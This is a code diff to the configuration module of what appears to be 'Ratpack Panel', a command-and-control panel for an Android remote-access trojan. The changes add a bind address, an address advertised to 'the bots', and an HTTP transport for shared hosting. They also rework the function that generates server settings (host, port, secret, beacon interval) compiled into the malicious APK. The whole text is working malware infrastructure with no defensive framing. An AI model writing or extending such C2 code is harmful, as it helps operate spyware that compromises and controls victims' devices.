@@ -31,9 +31,11 @@ DEFAULTS = {
     "version": 1,
     "mode": "web",                  # web | bot
     "c2": {
-        "host": "0.0.0.0",
+        "bind": "0.0.0.0",           # where the C2 listens
+        "host": "0.0.0.0",           # the address advertised to the bots
         "port": 8777,
         "protocol": "tcp",           # tcp | tls
+        "transport": "tcp",          # tcp | http (http = shared hosting)
         "cert": "",
         "key": "",
     },
@@ -104,14 +106,23 @@ def build_setting_json(cfg: dict) -> dict:
     folder, the compiler bakes it into the APK.
     """
     c2 = cfg.get("c2", {})
+    transport = c2.get("transport", "tcp")
+    if transport not in ("tcp", "http"):
+        transport = "tcp"
+    host = c2.get("host", "0.0.0.0")
+    if transport == "http":
+        # The bots talk HTTP, so they need a URL, not host:port.
+        if not host.startswith("http://") and not host.startswith("https://"):
+            host = "http://" + host
     return {
         "version": 1,
         "generated_by": "Ratpack Panel",
         "generated_at": _now(),
         "server": {
-            "host": c2.get("host", "0.0.0.0"),
+            "host": host,
             "port": int(c2.get("port", 8777)),
             "protocol": c2.get("protocol", "tcp"),
+            "transport": transport,
             "secret": cfg.get("secret", ""),
             "beacon_ms": int(cfg.get("beacon_ms", 15000)),
             "timeout_ms": int(cfg.get("timeout_ms", 10000)),
